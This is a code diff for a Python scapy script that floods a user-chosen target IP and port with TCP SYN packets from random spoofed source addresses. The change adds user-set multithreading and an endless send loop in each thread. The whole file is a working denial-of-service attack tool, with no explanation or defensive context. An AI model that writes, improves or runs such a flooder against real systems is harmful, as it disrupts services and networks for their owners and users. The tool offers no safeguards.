@@ -1,14 +1,23 @@
 from scapy.all import *
+import threading
 
-ip = input("IP: ")
+ip = input("Enter the target to attack: ")
 port = int(input("Port: "))
+thr = int(input("Thread: "))
 
-def tcp_syn(ip_adress, sport, dport):
-    s_address = RandIP()
-    d_adress = ip_adress
+def tcp_syn(ip_adress, sport, dport, i):
 
-    packet = IP(src=s_address, dst=d_adress)/TCP(sport=sport, dport=dport, seq=1255066, flags="S")
-    send(packet)
+    while(True):
+        print("Threading: ", i)
+        s_address = RandIP()
+        d_adress = ip_adress
+        packet = IP(src=s_address, dst=d_adress)/TCP(sport=sport, dport=dport, seq=1255066, flags="S")
+        send(packet)
 
-while(True):
-    tcp_syn(ip, 1234, port)
+
+thrList = list ()
+
+for i in range (thr) :
+    thrSyn = threading.Thread(target = tcp_syn, args = (ip, port, 1234, i,))
+    thrList.append(thrSyn)
+    thrSyn.start()
